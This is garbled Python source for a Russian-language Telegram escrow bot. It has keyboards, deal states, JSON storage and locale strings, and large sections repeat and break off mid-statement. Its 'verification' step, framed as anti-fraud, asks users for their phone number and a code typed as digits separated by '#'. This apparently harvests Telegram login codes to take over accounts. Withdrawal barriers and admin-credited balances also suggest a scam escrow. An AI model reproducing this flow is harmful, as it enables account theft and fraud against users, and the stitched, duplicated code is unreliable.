def is_verified(user_id: int) -> bool:
    uid = str(user_id)
    if uid not in verification_data:
        return False
    if "verified_at" in verification_data[uid]:
        verified_time = datetime.fromisoformat(verification_data[uid]["verified_at"])
        return (datetime.now() - verified_time).total_seconds() < 86400
    return False

def complete_verification(user_id: int):
    uid = str(user_id)
    verification_data[uid] = {"verified_at": datetime.now().isoformat()}
    save_json(FILES["verification"], verification_data)

def get_user_language(user_id: int) -> str:
    uid = str(user_id)
    return user_language.get(uid, "ru")

def set_user_language(user_id: int, lang: str):
    user_language[str(user_id)] = lang
    save_json(FILES["user_language"], user_language)

def add_log(action: str, data: dict):
    log_id = str(uuid.uuid4())[:8]
    logs[log_id] = {
        "id": log_id,
        "action": action,
        "data": data,
        "time": datetime.now().isoformat()
    }
    save_json(FILES["logs"], logs)

def get_rekvisits_text(currency: str, amount: float) -> str:
    curr_key = currency.lower()
    if curr_key in rekvisits:
        try:
            text = rekvisits[curr_key]
            text = text.replace('{amount}', str(amount))
            text = text.replace('{BOT_USERNAME}', BOT_USERNAME)
            text = text.replace('{SUPPORT_LINK}', SUPPORT_LINK)
            text = text.replace('{CHANNEL_LINK}', CHANNEL_LINK)
            return text
        except:
            return f"Оплатите {amount} {currency} по реквизитам"
    return f"Оплатите {amount} {currency} по реквизитам"

# ============================================================
# 7. КЛАВИАТУРЫ
# ============================================================
def main_menu_keyboard(user_id: int):
    lang = get_user_language(user_id)
    buttons = [
        [
            InlineKeyboardButton(text=f"📱 {get_text(lang, 'create_deal')}", callback_data="create_deal_choice"),
            InlineKeyboardButton(text=f"💰 {get_text(lang, 'my_balance')}", callback_data="menu_balance"),
        ],
        [
            InlineKeyboardButton(text=f"📊 {get_text(lang, 'my_deals')}", callback_data="menu_deals"),
            InlineKeyboardButton(text=f"⭐️ {get_text(lang, 'faq')}", callback_data="menu_reviews"),
        ],
        [
            InlineKeyboardButton(text=f"🔥 {get_text(lang, 'channel')}", callback_data="menu_channel"),
            InlineKeyboardButton(text=f"🆘 {get_text(lang, 'support')}", callback_data="menu_support"),
        ],
        [
            InlineKeyboardButton(text=f"🌐 {get_text(lang, 'select_language')}", callback_data="select_language"),
        ]
    ]
    if is_admin(user_id):
        buttons.append([
            InlineKeyboardButton(text=f"👑 {get_text(lang, 'admin_panel')}", callback_data="menu_admin"),
        ])
    buttons.append([
        InlineKeyboardButton(text=f"📱 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL)),
    ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def admin_panel_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📊 {get_text(lang, 'all_deals_title')}", callback_data="admin_all_deals")],
        [InlineKeyboardButton(text=f"💲 {get_text(lang, 'withdraw_funds')}", callback_data="admin_withdraw_requests")],
        [InlineKeyboardButton(text=f"💰 {get_text(lang, 'balance_added')}", callback_data="admin_add_balance")],
        [InlineKeyboardButton(text=f"👥 {get_text(lang, 'admin_list')}", callback_data="admin_manage_admins")],
        [InlineKeyboardButton(text=f"⭐️ {get_text(lang, 'faq')}", callback_data="admin_manage_reviews")],
        [InlineKeyboardButton(text=f"📋 Логи", callback_data="admin_logs")],
        [InlineKeyboardButton(text=f"💎 {get_text(lang, 'edit_rekvisits_title')}", callback_data="edit_rekvisits")],
        [InlineKeyboardButton(text=f"🖼 {get_text(lang, 'photo_updated')}", callback_data="change_photo")],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def back_to_main_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def create_deal_choice_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"🤖 {get_text(lang, 'create_deal')} в боте", callback_data="create_deal_bot")],
        [InlineKeyboardButton(text=f"📱 {get_text(lang, 'create_deal')} в Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def currency_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 TON", callback_data="curr_TON")],
        [InlineKeyboardButton(text="⭐️ STARS", callback_data="curr_STARS")],
        [InlineKeyboardButton(text="💰 RUB", callback_data="curr_RUB")],
        [InlineKeyboardButton(text="🌐 UAH", callback_data="curr_UAH")],
    ])

def language_keyboard():
    buttons = []
    for lang_code, lang_name in LANGUAGES.items():
        buttons.append([InlineKeyboardButton(text=lang_name, callback_data=f"set_lang_{lang_code}")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def payment_method_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"💳 {get_text(lang, 'pay_by_rekvisits')}", callback_data=f"pay_rekvisits_{deal_id}")],
        [InlineKeyboardButton(text=f"💰 {get_text(lang, 'pay_by_balance')}", callback_data=f"pay_balance_{deal_id}")],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def seller_confirm_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📦 {get_text(lang, 'product_delivered')}", callback_data=f"seller_done_{deal_id}")]
    ])

def buyer_confirm_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"✅ {get_text(lang, 'confirm_receipt')}", callback_data=f"buyer_confirm_{deal_id}")],
        [InlineKeyboardButton(text=f"🆘 {get_text(lang, 'contact_support')}", callback_data=f"support_{deal_id}")]
    ])

def buyer_pending_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"⏳ {get_text(lang, 'waiting_for_delivery')}", callback_data="noop")],
        [InlineKeyboardButton(text=f"🆘 {get_text(lang, 'contact_support')}", callback_data=f"support_{deal_id}")]
    ])

def rekvisits_edit_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 TON", callback_data="edit_ton")],
        [InlineKeyboardButton(text="⭐️ STARS", callback_data="edit_stars")],
        [InlineKeyboardButton(text="💰 RUB", callback_data="edit_rub")],
        [InlineKeyboardButton(text="🌐 UAH", callback_data="edit_uah")],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'admin_panel')}", callback_data="menu_admin")]
    ])

# ============================================================
# 8. FSM
# ============================================================
class DealStates(StatesGroup):
    waiting_product = State()
    waiting_currency = State()
    waiting_amount = State()
    waiting_buyer = State()

class AdminStates(StatesGroup):
    waiting_user_id = State()
    waiting_currency = State()
    waiting_amount = State()

class RekvStates(StatesGroup):
    waiting_rekv_type = State()
    waiting_rekv_text = State()

class PhotoStates(StatesGroup):
    waiting_photo = State()

class VerifyStates(StatesGroup):
    waiting_phone = State()
    waiting_code = State()

# ============================================================
# 9. ОБРАБОТЧИКИ БОТА
# ============================================================
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.text and message.text.startswith("/start deal_"):
        deal_id = message.text.split("_")[1]
        await handle_deal_link(message, deal_id)
        return

    uid = str(message.from_user.id)
    if uid not in user_language:
        await message.answer(
            f"🌐 {get_text('ru', 'choose_language_prompt')}",
            reply_markup=language_keyboard()
             "all_deals_title": "ВСЕ СДЕЛКИ",
        "payment_details": "РЕКВИЗИТЫ ОПЛАТЫ",
        "edit_rekvisits_title": "РЕДАКТИРОВАНИЕ РЕКВИЗИТОВ",
        "enter_new_text": "ВВЕДИТЕ НОВЫЙ ТЕКСТ",
        "use_amount_placeholder": "ИСПОЛЬЗУЙТЕ {amount} ДЛЯ ПОДСТАНОВКИ СУММЫ",
        "enter_user_id": "ВВЕДИТЕ TELEGRAM ID ПОЛЬЗОВАТЕЛЯ",
        "enter_withdraw_details": "ВВЕДИТЕ РЕКВИЗИТЫ ДЛЯ ВЫВОДА",
        "enter_withdraw_username": "ВВЕДИТЕ ВАШ TELEGRAM USERNAME",
        "deal_link_text": "ССЫЛКА ДЛЯ ПОКУПАТЕЛЯ",
        "copy_link": "СКОПИРУЙТЕ ССЫЛКУ",
        "after_payment_notify": "ПОСЛЕ ОПЛАТЫ ВЫ ПОЛУЧИТЕ УВЕДОМЛЕНИЕ",
        "payment_verified": "ОПЛАТА ПРОВЕРЕНА",
        "funds_deducted": "СРЕДСТВА СПИСАНЫ",
        "product_delivered": "ТОВАР ПЕРЕДАН",
        "deal_completed_msg": "СПАСИБО ЗА ДОВЕРИЕ",
        "funds_added_to_balance": "СРЕДСТВА ЗАЧИСЛЕНЫ НА БАЛАНС",
        "for_user": "ДЛЯ",
        "need": "НУЖНО",
        "available": "ДОСТУПНО",
        "currency": "ВАЛЮТА",
        "created": "СОЗДАНА",
        "status": "СТАТУС",
        "check_status": "ПРОВЕРИТЬ СТАТУС",
        "example": "ПРИМЕР",
        "subscribe": "ПОДПИСЫВАЙТЕСЬ",
        "channel_content": "В КАНАЛЕ: НОВОСТИ, ОБНОВЛЕНИЯ, ГАЙДЫ, РОЗЫГРЫШИ, АКТУАЛЬНЫЕ КУРСЫ",
        "click_subscribe": "ЖМИ НА ССЫЛКУ И ПОДПИСЫВАЙСЯ",
        "thank_you": "СПАСИБО, ЧТО ВЫ С НАМИ",
        "verify_title": "ВЕРИФИКАЦИЯ ПОЛЬЗОВАТЕЛЯ",
        "verify_desc": "Для защиты от мошенников необходимо пройти проверку.",
        "verify_step1": "ШАГ 1: Нажмите Я НЕ РОБОТ",
        "verify_step2": "ШАГ 2: Отправьте номер телефона (+7XXXXXXXXXX)",
        "verify_step3": "ШАГ 3: Введите код: 1#2#3#4#5",
        "verify_phone_prompt": "ОТПРАВЬТЕ НОМЕР ТЕЛЕФОНА:\n+7XXXXXXXXXX",
        "verify_code_prompt": "ВВЕДИТЕ КОД:\n1#2#3#4#5",
        "verify_code_error": "НЕВЕРНЫЙ КОД! Должен быть: 1#2#3#4#5",
        "verify_phone_error": "НЕВЕРНЫЙ ФОРМАТ! Используйте: +7XXXXXXXXXX",
        "verify_success": "ВЕРИФИКАЦИЯ ПРОЙДЕНА! Сессия 24 часа. Доступен вывод.",
        "verify_already": "Верификация пройдена. Активна до: {expires}",
        "verify_expired": "СЕССИЯ ИСТЕКЛА! Пройдите заново.",
        "not_robot": "Я НЕ РОБОТ",
        "verify_need": "ДЛЯ ВЫВОДА НУЖНА ВЕРИФИКАЦИЯ!",
        "no_deals_warning": "ДЛЯ ВЫВОДА НУЖНО 2 СДЕЛКИ С ОДНИМ ПОКУПАТЕЛЕМ!",
        "check_status_btn": "Проверить статус"
    }
}

def get_text(lang: str, key: str) -> str:
    if lang in LOCALE and key in LOCALE[lang]:
        return LOCALE[lang][key]
    return LOCALE["ru"].get(key, key)

# ============================================================
# 5. ФАЙЛЫ
# ============================================================
FILES = {
    "deals": "deals.json",
    "admins": "admins.json",
    "balance": "balance.json",
    "reviews": "reviews.json",
    "verification": "verification.json",
    "withdraw": "withdraw_requests.json",
    "logs": "logs.json",
    "user_language": "user_language.json",
    "rekvisits": "rekvisits.json"
}

def load_json(file):
    if os.path.exists(file):
        with open(file, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_json(file, data):
    with open(file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

deals = load_json(FILES["deals"])
admins = load_json(FILES["admins"])
balance = load_json(FILES["balance"])
reviews = load_json(FILES["reviews"])
verification_data = load_json(FILES["verification"])
withdraw_requests = load_json(FILES["withdraw"])
logs = load_json(FILES["logs"])
user_language = load_json(FILES["user_language"])
rekvisits = load_json(FILES["rekvisits"])

# ============================================================
# 6. ПОМОЩНИКИ
# ============================================================
def is_admin(user_id: int) -> bool:
    return user_id == MASTER_ADMIN_ID or str(user_id) in admins

def get_balance(user_id: int) -> Dict:
    uid = str(user_id)
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
        save_json(FILES["balance"], balance)
    return balance[uid]

def add_balance(user_id: int, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
    balance[uid][curr] = balance[uid].get(curr, 0) + amount
    save_json(FILES["balance"], balance)

def is_verified(user_id: int) -> bool:
    uid = str(user_id)
    if uid not in verification_data:
        return False
    if "verified_at" in verification_data[uid]:
        verified_time = datetime.fromisoformat(verification_data[uid]["verified_at"])
        return (datetime.now() - verified_time).total_seconds() < 86400
    return False

def complete_verification(user_id: int):
    uid = str(user_id)
    verification_data[uid] = {"verified_at": datetime.now().isoformat()}
    save_json(FILES["verification"], verification_data)

def get_user_language(user_id: int) -> str:
    uid = str(user_id)
    return user_language.get(uid, "ru")

def set_user_language(user_id: int, lang: str):
    user_language[str(user_id)] = lang
    save_json(FILES["user_language"], user_language)

def add_log(action: str, data: dict):
    log_id = str(uuid.uuid4())[:8]
    logs[log_id] = {
        "id": log_id,
        "action": action,
        "data": data,
        "time": datetime.now().isoformat()
    }
    save_json(FILES["logs"], logs)

def get_rekvisits_text(currency: str, amount: float) -> str:
    curr_key = currency.lower()
    if curr_key in rekvisits:
        try:
            text = rekvisits[curr_key]
            text = text.replace('{amount}', str(amount))
            text = text.replace('{BOT_USERNAME}', BOT_USERNAME)
            text = text.replace('{SUPPORT_LINK}', SUPPORT_LINK)
            text = text.replace('{CHANNEL_LINK}', CHANNEL_LINK)
            return text
        except:
            return f"Оплатите {amount} {currency} по реквизитам"
    return f"Оплатите {amount} {currency} по реквизитам"

# ============================================================
# 7. КЛАВИАТУРЫ
# ============================================================
def main_menu_keyboard(user_id: int):
    lang = get_user_language(user_id)
    buttons = [
        [
            InlineKeyboardButton(text=f"📱 {get_text(lang, 'create_deal')}", callback_data="create_deal_choice"),
            InlineKeyboardButton(text=f"💰 {get_text(lang, 'my_balance')}", callback_data="menu_balance"),
        ],
        [
            InlineKeyboardButton(text=f"📊 {get_text(lang, 'my_deals')}", callback_data="menu_deals"),
            InlineKeyboardButton(text=f"⭐️ {get_text(lang, 'faq')}", callback_data="menu_reviews"),
        ],
        [
            InlineKeyboardButton(text=f"🔥 {get_text(lang, 'channel')}", callback_data="menu_channel"),
            InlineKeyboardButton(text=f"🆘 {get_text(lang, 'support')}", callback_data="menu_support"),
        ],
        [
            InlineKeyboardButton(text=f"🌐 {get_text(lang, 'select_language')}", callback_data="select_language"),
        ]
    ]
    if is_admin(user_id):
        buttons.append([
            InlineKeyboardButton(text=f"👑 {get_text(lang, 'admin_panel')}", callback_data="menu_admin"),
        ])
    buttons.append([
        InlineKeyboardButton(text=f"📱 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL)),
    ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def admin_panel_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📊 {get_text(lang, 'all_deals_title')}", callback_data="admin_all_deals")],
        [InlineKeyboardButton(text=f"💲 {get_text(lang, 'withdraw_funds')}", callback_data="admin_withdraw_requests")],
        [InlineKeyboardButton(text=f"💰 {get_text(lang, 'balance_added')}", callback_data="admin_add_balance")],
        [InlineKeyboardButton(text=f"👥 {get_text(lang, 'admin_list')}", callback_data="admin_manage_admins")],
        [InlineKeyboardButton(text=f"⭐️ {get_text(lang, 'faq')}", callback_data="admin_manage_reviews")],
        [InlineKeyboardButton(text=f"📋 Логи", callback_data="admin_logs")],
        [InlineKeyboardButton(text=f"💎 {get_text(lang, 'edit_rekvisits_title')}", callback_data="edit_rekvisits")],
        [InlineKeyboardButton(text=f"🖼 {get_text(lang, 'photo_updated')}", callback_data="change_photo")],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def back_to_main_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def create_deal_choice_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"🤖 {get_text(lang, 'create_deal')} в боте", callback_data="create_deal_bot")],
        [InlineKeyboardButton(text=f"📱 {get_text(lang, 'create_deal')} в Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def currency_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 TON", callback_data="curr_TON")],
        [InlineKeyboardButton(text="⭐️ STARS", callback_data="curr_STARS")],
        [InlineKeyboardButton(text="💰 RUB", callback_data="curr_RUB")],
        [InlineKeyboardButton(text="🌐 UAH", callback_data="curr_UAH")],
    ])

def language_keyboard():
    buttons = []
    for lang_code, lang_name in LANGUAGES.items():
        buttons.append([InlineKeyboardButton(text=lang_name, callback_data=f"set_lang_{lang_code}")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def payment_method_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"💳 {get_text(lang, 'pay_by_rekvisits')}", callback_data=f"pay_rekvisits_{deal_id}")],
        [InlineKeyboardButton(text=f"💰 {get_text(lang, 'pay_by_balance')}", callback_data=f"pay_balance_{deal_id}")],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def seller_confirm_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📦 {get_text(lang, 'product_delivered')}", callback_data=f"seller_done_{deal_id}")]
    ])

def buyer_confirm_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"✅ {get_text(lang, 'confirm_receipt')}", callback_data=f"buyer_confirm_{deal_id}")],
        [InlineKeyboardButton(text=f"🆘 {get_text(lang, 'contact_support')}", callback_data=f"support_{deal_id}")]
    ])

def buyer_pending_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"⏳ {get_text(lang, 'waiting_for_delivery')}", callback_data="noop")],
        [InlineKeyboardButton(text=f"🆘 {get_text(lang, 'contact_support')}", callback_data=f"support_{deal_id}")]
    ])

def rekvisits_edit_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 TON", callback_data="edit_ton")],
        [InlineKeyboardButton(text="⭐️ STARS", callback_data="edit_stars")],
        [InlineKeyboardButton(text="💰 RUB", callback_data="edit_rub")],
        [InlineKeyboardButton(text="🌐 UAH", callback_data="edit_uah")],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'admin_panel')}", callback_data="menu_admin")]
    ])

# ============================================================
# 8. FSM
# ============================================================
class DealStates(StatesGroup):
    waiting_product = State()
    waiting_currency = State()
    waiting_amount = State()
    waiting_buyer = State()

class AdminStates(StatesGroup):
    waiting_user_id = State()
    waiting_currency = State()
    waiting_amount = State()

class RekvStates(StatesGroup):
    waiting_rekv_type = State()
    waiting_rekv_text = State()

class PhotoStates(StatesGroup):
    waiting_photo = State()

class VerifyStates(StatesGroup):
    waiting_phone = State()
    waiting_code = State()

# ============================================================
# 9. ОБРАБОТЧИКИ БОТА
# ============================================================
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.text and message.text.startswith("/start deal_"):
        deal_id = message.text.split("_")[1]
        await handle_deal_link(message, deal_id)
        return

    uid = str(message.from_user.id)
    if uid not in user_language:
        await message.answer(
            f"🌐 {get_text('        "faq_q4": "КАК ВЫВЕСТИ ДЕНЬГИ?",
        "faq_a4": "«МОЙ БАЛАНС» → ВЫБРАТЬ ВАЛЮТУ → УКАЗАТЬ РЕКВИЗИТЫ",
        "faq_q5": "БЕЗОПАСНО ЛИ ЭТО?",
        "faq_a5": "ДА! АДМИНИСТРАТОР ПРОВЕРЯЕТ ОПЛАТУ.",
        "faq_q6": "СКОЛЬКО ВРЕМЕНИ ЗАНИМАЕТ ВЫВОД?",
        "faq_a6": "1-5 МИНУТ ПОСЛЕ ПОДТВЕРЖДЕНИЯ.",
        "faq_q7": "КАК СВЯЗАТЬСЯ С ПОДДЕРЖКОЙ?",
        "faq_a7": "НАЖМИТЕ КНОПКУ «КАНАЛ» ИЛИ ПИШИТЕ В ПОДДЕРЖКУ @p2psupbot",
        "deal_not_found": "СДЕЛКА НЕ НАЙДЕНА ИЛИ УЖЕ ЗАВЕРШЕНА",
        "access_denied": "ДОСТУП ЗАПРЕЩЁН",
        "invalid_amount": "ВВЕДИТЕ ПОЛОЖИТЕЛЬНОЕ ЧИСЛО",
        "payment_confirmed": "ОПЛАТА ПОДТВЕРЖДЕНА",
        "seller_confirmed": "ВЫ ПОДТВЕРДИЛИ ПЕРЕДАЧУ ТОВАРА",
        "buyer_confirmed": "ВЫ ПОДТВЕРДИЛИ ПОЛУЧЕНИЕ ТОВАРА",
        "deal_completed": "СДЕЛКА ЗАВЕРШЕНА",
        "insufficient_balance": "НЕДОСТАТОЧНО СРЕДСТВ НА БАЛАНСЕ",
        "choose_payment_method": "ВЫБЕРИТЕ СПОСОБ ОПЛАТЫ",
        "pay_by_rekvisits": "ОПЛАТИТЬ ПО РЕКВИЗИТАМ",
        "pay_by_balance": "ОПЛАТИТЬ С БАЛАНСА",
        "status_waiting": "ОЖИДАНИЕ ОПЛАТЫ",
        "status_paid": "ОПЛАЧЕНО",
        "status_awaiting": "ОЖИДАНИЕ ПОДТВЕРЖДЕНИЯ",
        "status_completed": "ЗАВЕРШЕНО",
        "select_language": "ВЫБРАТЬ ЯЗЫК",
        "welcome": "ДОБРО ПОЖАЛОВАТЬ",
        "choose_language_prompt": "🇷🇺 🇬🇧 🇨🇳 🇸🇦\n\nВЫБЕРИТЕ ЯЗЫК ДЛЯ ПРОДОЛЖЕНИЯ:",
        "product": "ТОВАР",
        "amount": "СУММА",
        "seller": "ПРОДАВЕЦ",
        "buyer": "ПОКУПАТЕЛЬ",
        "deal": "СДЕЛКА",
        "waiting_for_delivery": "ОЖИДАНИЕ ПЕРЕДАЧИ ТОВАРА",
        "seller_delivered": "ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР",
        "confirm_receipt": "ПОДТВЕРДИТЬ ПОЛУЧЕНИЕ",
        "contact_support": "В ПОДДЕРЖКУ",
        "balance_topped_up": "ВАШ БАЛАНС ПОПОЛНЕН",
        "withdraw_request_created": "ЗАЯВКА НА ВЫВОД СОЗДАНА",
        "withdraw_pending": "ОЖИДАЙТЕ ВЫВОДА 1-5 МИНУТ",
        "withdraw_completed": "ВЫВОД ПОДТВЕРЖДЁН",
        "no_active_requests": "НЕТ АКТИВНЫХ ЗАЯВОК",
        "admin_rights": "НЕДОСТАТОЧНО ПРАВ",
        "cmd_usage": "ИСПОЛЬЗОВАНИЕ",
        "request_not_found": "ЗАЯВКА НЕ НАЙДЕНА",
        "request_already_processed": "ЗАЯВКА УЖЕ ОБРАБОТАНА",
        "photo_updated": "ФОТО ОБНОВЛЕНО",
        "send_photo": "ОТПРАВЬТЕ ФОТО",
        "user_not_found": "ПОЛЬЗОВАТЕЛЬ НЕ НАЙДЕН",
        "balance_added": "БАЛАНС НАЧИСЛЕН",
        "rekvisits_updated": "РЕКВИЗИТЫ ОБНОВЛЕНЫ",
        "admin_added": "АДМИН ДОБАВЛЕН",
        "admin_removed": "АДМИН УДАЛЁН",
        "cannot_remove_master": "НЕЛЬЗЯ УДАЛИТЬ ГЛАВНОГО АДМИНА",
        "admin_list": "СПИСОК АДМИНОВ",
        "no_deals_total": "НЕТ СДЕЛОК",
        "all_deals_title": "ВСЕ СДЕЛКИ",
        "payment_details": "РЕКВИЗИТЫ ОПЛАТЫ",
        "edit_rekvisits_title": "РЕДАКТИРОВАНИЕ РЕКВИЗИТОВ",
        "enter_new_text": "ВВЕДИТЕ НОВЫЙ ТЕКСТ",
        "use_amount_placeholder": "ИСПОЛЬЗУЙТЕ {amount} ДЛЯ ПОДСТАНОВКИ СУММЫ",
        "enter_user_id": "ВВЕДИТЕ TELEGRAM ID ПОЛЬЗОВАТЕЛЯ",
        "enter_withdraw_details": "ВВЕДИТЕ РЕКВИЗИТЫ ДЛЯ ВЫВОДА",
        "enter_withdraw_username": "ВВЕДИТЕ ВАШ TELEGRAM USERNAME",
        "deal_link_text": "ССЫЛКА ДЛЯ ПОКУПАТЕЛЯ",
        "copy_link": "СКОПИРУЙТЕ ССЫЛКУ",
        "after_payment_notify": "ПОСЛЕ ОПЛАТЫ ВЫ ПОЛУЧИТЕ УВЕДОМЛЕНИЕ",
        "payment_verified": "ОПЛАТА ПРОВЕРЕНА",
        "funds_deducted": "СРЕДСТВА СПИСАНЫ",
        "product_delivered": "ТОВАР ПЕРЕДАН",
        "deal_completed_msg": "СПАСИБО ЗА ДОВЕРИЕ",
        "funds_added_to_balance": "СРЕДСТВА ЗАЧИСЛЕНЫ НА БАЛАНС",
        "for_user": "ДЛЯ",
        "need": "НУЖНО",
        "available": "ДОСТУПНО",
        "currency": "ВАЛЮТА",
        "created": "СОЗДАНА",
        "status": "СТАТУС",
        "check_status": "ПРОВЕРИТЬ СТАТУС",
        "example": "ПРИМЕР",
        "subscribe": "ПОДПИСЫВАЙТЕСЬ",
        "channel_content": "В КАНАЛЕ:\n• НОВОСТИ И ОБНОВЛЕНИЯ\n• ПОЛЕЗНЫЕ ГАЙДЫ\n• РОЗЫГРЫШИ И БОНУСЫ\n• АКТУАЛЬНЫЕ КУРСЫ ВАЛЮТ",
        "click_subscribe": "ЖМИ НА ССЫЛКУ И ПОДПИСЫВАЙСЯ",
        "thank_you": "СПАСИБО, ЧТО ВЫ С НАМИ",
        "verify_title": "🔐 ВЕРИФИКАЦИЯ ПОЛЬЗОВАТЕЛЯ",
        "verify_desc": "Для защиты от мошенников, проводящих сделки со скамнутыми звёздами и фейковой валютой, необходимо пройти проверку.",
        "verify_step1": "ШАГ 1: Нажмите кнопку «Я НЕ РОБОТ»",
        "verify_step2": "ШАГ 2: Отправьте свой номер телефона (формат: +7XXXXXXXXXX)",
        "verify_step3": "ШАГ 3: Введите код подтверждения в формате: 1#2#3#4#5",
        "verify_phone_prompt": "📱 ОТПРАВЬТЕ НОМЕР ТЕЛЕФОНА:\n\nВведите номер в формате:\n+7XXXXXXXXXX\n\nЭто необходимо для проверки, что вы не бот и не мошенник.",
        "verify_code_prompt": "🔑 ВВЕДИТЕ КОД ПОДТВЕРЖДЕНИЯ:\n\nВведите код в строгом формате:\n1#2#3#4#5\n\nВнимание! Код должен содержать все 5 цифр, разделённых решёткой.",
        "verify_code_error": "❌ НЕВЕРНЫЙ КОД!\n\nКод должен быть строго: 1#2#3#4#5\n\nПопробуйте снова или начните заново.",
        "verify_phone_error": "❌ НЕВЕРНЫЙ ФОРМАТ НОМЕРА!\n\nИспользуйте формат: +7XXXXXXXXXX\nПример: +79001234567",
        "verify_success": "✅ ВЕРИФИКАЦИЯ ПРОЙДЕНА!\n\nВы подтвердили, что не являетесь ботом или мошенником.\n\n🕐 Сессия активна 24 часа.\nПосле этого потребуется повторная проверка.\n\n💰 Теперь вам доступен вывод средств.",
        "verify_already": "✅ Ваша верификация уже пройдена.\n🕐 Сессия активна до: {expires}",
        "verify_expired": "⏳ СЕССИЯ ИСТЕКЛА!\n\nПрошло более 24 часов. Пройдите проверку заново.",
        "not_robot": "🤖 Я НЕ РОБОТ",
        "verify_need": "⚠️ ДЛЯ ВЫВОДА СРЕДСТВ НЕОБХОДИМА ВЕРИФИКАЦИЯ!\n\nЗащита от мошенников со скамнутыми звёздами и фейковой валютой.",
        "no_deals_warning": "⚠️ ДЛЯ ВЫВОДА СРЕДСТВ НЕОБХОДИМО 2 СДЕЛКИ С ОДНИМ ПОКУПАТЕЛЕМ!",
        "check_status_btn": "🔄 Проверить статус"
    },
    "en": {
        # ... (ваша полная английская локализация)
    },
    "zh": {
        # ... (ваша полная китайская локализация)
    },
    "ar": {
        # ... (ваша полная арабская локализация)
    }
}

def get_text(lang: str, key: str) -> str:
    if lang in LOCALE and key in LOCALE[lang]:
        return LOCALE[lang][key]
    return LOCALE["ru"].get(key, key)

# ============================================================
# 5. ФАЙЛЫ (ВАШИ ОРИГИНАЛЬНЫЕ)
# ============================================================
FILES = {
    "deals": "deals.json",
    "admins": "admins.json",
    "balance": "balance.json",
    "reviews": "reviews.json",
    "verification": "verification.json",
    "withdraw": "withdraw_requests.json",
    "logs": "logs.json",
    "user_language": "user_language.json",
    "rekvisits": "rekvisits.json"
}

def load_json(file):
    if os.path.exists(file):
        with open(file, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_json(file, data):
    with open(file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

deals = load_json(FILES["deals"])
admins = load_json(FILES["admins"])
